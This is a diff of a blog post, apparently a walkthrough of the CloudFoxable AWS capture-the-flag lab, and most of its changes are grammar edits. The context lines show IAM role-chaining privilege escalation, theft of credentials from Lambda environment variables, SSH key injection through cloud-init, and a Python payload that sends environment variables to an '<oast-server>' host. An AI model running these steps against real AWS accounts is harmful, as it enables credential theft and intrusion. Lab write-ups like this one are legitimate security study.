@@ -9,7 +9,7 @@ Checkout the challenges over at [GitHub](https://github.com/BishopFox/cloudfoxab
 
 ## Setup & First Flag
 
-My initial setup starts with getting into my [containerized security toolkit](https://github.com/tanq16/containerized-security-toolkit). From there, setup a sandbox account in the default organization (`security-testing`) with access keys of a user with admin privileges. Then, the following in serial order &rarr;
+My initial setup starts with getting into my [containerized security toolkit](https://github.com/tanq16/containerized-security-toolkit). From there, set up a sandbox account in the default organization (`security-testing`) with access keys of a user with admin privileges. Then, the following in serial order &rarr;
 
 ```bash
 awsn sts get-caller-identity # check user access keys
@@ -22,7 +22,7 @@ terraform init
 terraform apply
 ```
 
-That gives `terraform`'s output with a command to setup a starting user and the first flag in step 3. The command to execute is the following &rarr;
+That gives `terraform`'s output with a command to set up a starting user and the first flag in step 3. The command that needs to be executed is the following &rarr;
 
 ```bash
 echo "" >> ~/.aws/credentials && echo "[cloudfoxable]" >> ~/.aws/credentials && echo "aws_access_key_id = `terraform output -raw CTF_Start_User_Access_Key_Id`" >> ~/.aws/credentials && echo "aws_secret_access_key = `terraform output -raw CTF_Start_User_Secret_Access_Key`" >> ~/.aws/credentials && echo "region = us-west-2" >> ~/.aws/credentials
@@ -120,7 +120,7 @@ Without `cloudfox`, what's happening in the background is something that can be 
 awsn iam get-account-authorization-details --profile cloudfoxable > cloudfoxable-gaad.json
 ```
 
-This IAM dump contains everything in an AWS environment except for resource-based policies and SCPs and is a great analysis tool. The approach is slightly different here - unlike with `cloudfox`, it makes more sense to go in the opposite direction. Of course that means a ton of manual evaluation (hence tooling helps), but the evaluation experience is worth it to some extent. So, we start by listing all principals (roles) that `ctf-starting-user` can assume, then manually check the permissions for each to find something interesting and then check the policies to verify who can interact with the resource we're interested in. Of course, even the first step involves looking at whether a role explicitly trusts our principal, or does our principal has assume role permissions with the role trusting the account root. But all that is abstracted from the following commands &rarr;
+This IAM dump contains everything in an AWS environment except for resource-based policies and SCPs and is a great analysis tool. The approach is slightly different here - unlike with `cloudfox`, it makes more sense to go in the opposite direction. Of course, that means a ton of manual evaluation (hence tooling helps), but the evaluation experience is worth it to some extent. So, we start by listing all principals (roles) that `ctf-starting-user` can assume, then manually check the permissions for each to find something interesting, and then check the policies to verify who can interact with the resource we're interested in. Of course, even the first step involves looking at whether a role explicitly trusts our principal, or if our principal has assume-role permissions and the role trusts the account root. But all that is abstracted from the following commands &rarr;
 
 ```bash
 cat cloudfoxable.json | jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal=={"AWS":"arn:aws:iam::<ACCID>:user/ctf-starting-user"})'
@@ -135,14 +135,14 @@ Then the steps are the same as with `cloudfox`.
 
 This challenge gives the role `ramos` as the starting point i.e., it can be assumed by `ctf-starting-user`.
 
-This challenge is straightforward where the task is to evaluate the permissions of the `ramos` role. First, the role is setup like before and the permissions checked via the gaad as follows &rarr;
+This challenge is straightforward where the task is to evaluate the permissions of the `ramos` role. First, the role is set up like before and the permissions are checked via the gaad as follows &rarr;
 
 ```bash
 cat cloudfoxable.json | jq '.RoleDetailList[] | select(.RoleName=="arn:aws:iam::<ACCID>:role/ramos")'
 # shows a couple read only policies
 ```
 
-The most sensitive read only policy out of the three looks to be the one related to CloudFormation as that's where secrets could potentially lie. So listing out the stacks and the template of the available stacks, the next flag is obtained. The steps are as follows &rarr;
+The most sensitive read-only policy out of the three seems related to CloudFormation because that's where secrets could potentially lie. So, by listing out the stacks and the template of the available stacks, the next flag is obtained. The steps are as follows &rarr;
 
 ```bash
 aws cloudformation describe-stacks --profile ramos --region us-west-2
@@ -151,23 +151,23 @@ aws cloudformation get-template --stack-name cloudformationStack --profile ramos
 
 ## Root
 
-This challenge uses the starting point as the role `Kent` who needs to get the `root` flag in SSM parameter store.
+This challenge uses the starting point as the role `Kent`, which needs to get the `root` flag in the SSM parameter store.
 
-Now, no more differentiation between non-`cloudfox` and `cloudfox`-based methods. Let's combine. Also, instead of working backwards or forward, time to do both. After setting up the `Kent` role, the permissions of `Kent` are observed in policy `root-policy1` which allows it to `sts:AssumeRole` on `*`.
+Now, no more differentiation between non-`cloudfox` and `cloudfox`-based methods. Let's combine. Also, instead of working backward or forward, time to do both. After setting up the `Kent` role, the permissions of `Kent` are observed in policy `root-policy1` which allows it to `sts:AssumeRole` on `*`.
 
-Permissions can also be checked via `cloudfox` using the following instead of relying on gaad-analysis → 
+Permissions can also be checked via `cloudfox` using the following instead of relying on gaad-analysis &rarr
 
 ```bash
 cloudfox aws permissions --principal Kent -p cloudfoxable -v2
 ```
 
-Next, get secrets and their respective AWS commands with `cloudfox` to keep an eye on the `root` parameter. With that in hand, search using `cloudfox` to get who can perform `ssm:GetParameter` → 
+Next, get secrets and their respective AWS commands with `cloudfox` to keep an eye on the `root` parameter. With that in hand, search using `cloudfox` to get who can perform `ssm:GetParameter` &rarr
 
 ```bash
 cloudfox aws permissions -p cloudfoxable -v2 | grep "ssm:GetParameter"
 ```
 
-This shows that role `Lasso` can get the `root` parameter via permissions in the `important-policy`. Also, `Lasso`'s trust policy establishes trust for the role `Beard`. Checking the details of `Beard`, it trusts the account root. This means all principals which have an assume role permission can assume `Beard` i.e., `Kent` fits the bill. So, adding `Beard` as another role obtained via `Kent` and `Lasso` as one assumed via `Beard`, `Lasso` can be used to list the parameter and get the flag.
+This shows that role `Lasso` can get the `root` parameter via permissions in the `important-policy`. Also, `Lasso`'s trust policy establishes trust in the role `Beard`. Checking the details of `Beard`, it trusts the account root. This means all principals that have an assume-role permission can assume `Beard` i.e., `Kent` fits the bill. So, adding `Beard` as another role obtained via `Kent` and `Lasso` as one assumed via `Beard`, `Lasso` can be used to list the parameter and get the flag.
 
 ## Furls 1 & 2
 
@@ -181,7 +181,7 @@ cloudfox aws endpoints -p cloudfoxable -v2
 
 This gives the function URL for `furls1`, which can be called with `cURL` to retrieve the flag.
 
-The result from the previous command lists out another function URL (and that's the only one), so trying `cURL` on the `auth-me` function, it prompts to send a GET request with a username and password as parameters. Trying to list out the function in question, it shows the username and password variables within the environment. That can be sent via `cURL` &rarr;
+The result from the previous command lists out another function URL (and that's the only one), so trying `cURL` on the `auth-me` function, it prompts to send a GET request with a username and password as parameters. Trying to list out the function in question shows the username and password variables within the environment. That can be sent via `cURL` &rarr;
 
 ```bash
 awsn lambda list-functions --profile cloudfoxable --region us-west-2 | jq '.Functions[] | selectt(.FunctionName=="auth-me")' # get variables from environment
@@ -304,7 +304,7 @@ That gives the flag.
 
 ## Trust Me
 
-This challenge requires setting up a GitHub repo which is trusted by "something" in the environment. The challenge asks to find a role that trusts this repo and use that role to get a flag. Roles can be listed with `cloudfox` and trusts between them can also be listed as folllows &rarr;
+This challenge requires setting up a GitHub repo that is trusted by "something" in the environment. The challenge asks to find a role that trusts this repo and use that role to get a flag. Roles can be listed with `cloudfox` and trusts between them can also be listed as follows &rarr;
 
 ```bash
 cloudfoxable aws principals -p cloudfoxable -v2
@@ -319,7 +319,7 @@ cat cloudfoxable-gaad.json | jq '.RoleDetailList[] | select(.RoleName=="t_rodman
 cat cloudfoxable-gaad.json | jq '.Policies[] | select(.PolicyName=="trust-me")'
 ```
 
-This shows that a GitHub Action can be used to authenticate as `t_rodman` via `sts:AssumeRoleWithWebIdentity` from the repo in concern. Also, the role can get SSM parameters `trust-*`. With a little googling, this can be done via an action published by AWS. In the repo, a workflow can be setup as follows &rarr;
+This shows that a GitHub Action can be used to authenticate as `t_rodman` via `sts:AssumeRoleWithWebIdentity` from the repo in concern. Also, the role can get SSM parameters `trust-*`. With a little googling, this can be done via an action published by AWS. In the repo, a workflow can be set up as follows &rarr;
 
 ```yml
 name: cloudfoxableattack
@@ -349,9 +349,9 @@ Committing this to the repo runs the actions and the parameter value can be see 
 
 ## Wyatt
 
-This challenge starts with the bastion host from previous challenges, to provide internal foothold. It needs us to scan for services in the VPC and figure out the next steps to get a flag.
+This challenge starts with the bastion host from previous challenges, to provide an internal foothold. It needs us to scan for services in the VPC and figure out next steps to get a flag.
 
-To start off, it's best to scan for network-related items, ENIs and instances (given we're in a network). That gives an idea about the roles granted to the instances, so those roles can be looked up for permissions, which provides further hints into the type of services to look into. The following commands helped narrow down to objects of interest &rarr;
+To start, it's best to scan for network-related items, ENIs, and instances (given we're in a network). That gives an idea about the roles granted to the instances, so those roles can analyzed for permissions, which provides further hints into the type of services to look into. The following commands helped narrow down to objects of interest &rarr;
 
 ```bash
 cloudfox aws elastic-network-interfaces -p cloudfoxable -v2 # instances are of primary interest
@@ -429,7 +429,7 @@ awsn lambda invoke --function-name attackfunction --profile double_tap_xsdf outp
 cat outputfile | jq
 ```
 
-With these credentials, access to the instance that has the `ec2_privileged` role is needed. The instance has an open port 22, but it needs an SSH key. User data does not run after starting a stopped instance, unless it is used as a `cloud-init` script, which can be defined as following &rarr;
+With these credentials, access to the instance that has the `ec2_privileged` role is needed. The instance has an open port 22, but it needs an SSH key. User data does not run after starting a stopped instance unless it is used as a `cloud-init` script, which can be defined as the following &rarr;
 
 ```yml
 #cloud-config
@@ -461,7 +461,7 @@ awsn ec2 modify-instance-attribute --instance-id i-0hshshshshhshs --attribute us
 awsn ec2 start-instances --instance-id i-0hshshshshhshs --region us-west-2 --profile lambda_ec2
 ```
 
-This instates the key into the instance and allows SSH-ing into the instance associated with the `ec2_privileged` role, which allows us to start an SSM session with the other instance with `double_tap2` tag and associated role `double_tap_secret` to read the secret flag &rarr;
+This instates the key into the instance and allows SSH-ing into the instance associated with the `ec2_privileged` role, which allows us to start an SSM session with the other instance with the `double_tap2` tag and associated role `double_tap_secret` to read the secret flag &rarr;
 
 ```bash
 awsn ssm start-session --target i-06eeb27aff191127a --region us-west-2 --profile ec2_privileged
@@ -479,9 +479,9 @@ cloudfox aws permissions --principal viniciusjr -p cloudfoxable -v2
 cloudfox aws sns -p cloudfoxable -v2
 ```
 
-`viniciusjr` has SNS read only access. Listing out SNS topic in the account, the `executioner` topic allows anyone to publish or subscribe to it via the resource policy as long as they're in the same account. With the current permissions, it's hard to establish a direct link between the topic and it's Lambda trigger, but that's generally common and we also have a Lambda function with the same name already.
+`viniciusjr` has SNS read-only access. Listing out the SNS topic in the account, the `executioner` topic allows anyone to publish or subscribe to it via the resource policy as long as they're in the same account. With the current permissions, it's hard to establish a direct link between the topic and its Lambda trigger, but that's generally common and we also have a Lambda function with the same name already.
 
-> ***Solution Caveat*** &rarr; The challenge does not grant any role the ability to view Lambda execution logs to get a sense of what is being executed. Hence, it's easier to look at the logs using a privileged role instead. This can also be fixed by adding a policy attachment to allow viewing the CloudWatch Logs.
+> ***Solution Caveat*** &rarr; The challenge does not grant any role the ability to view Lambda execution logs to get a sense of what is being executed. Hence, it's easier to look at the logs using a privileged role instead. This can also be fixed by adding a policy attachment to allow viewing of the CloudWatch Logs.
 {: .prompt-warning }
 
 Therefore, sending a message to the topic executes ***a*** Lambda function, the logs of which can be seen in CloudWatch. Therefore, invoking the following &rarr;
@@ -553,4 +553,4 @@ python -c 'import http.client; conn = http.client.HTTPConnection("<oast-server>"
 
 This can be generated into a payload and sent to the SQS queue, which in turn will send the base64 encoded version of the OS environment variables to the OAST server. These variables show the AWS environment variables related to `swanson`'s session in the Lambda execution logs, which can be used to read the SSM parameter `/cloudfoxable/flag/lambda-sqs` which gives the flag.
 
-This solves the challenge with the caveat that the `consumer` function code needed to be modified to allow for execution of payloads.
+This solves the challenge with the caveat that the `consumer` function code needed to be modified to allow for the execution of payloads.
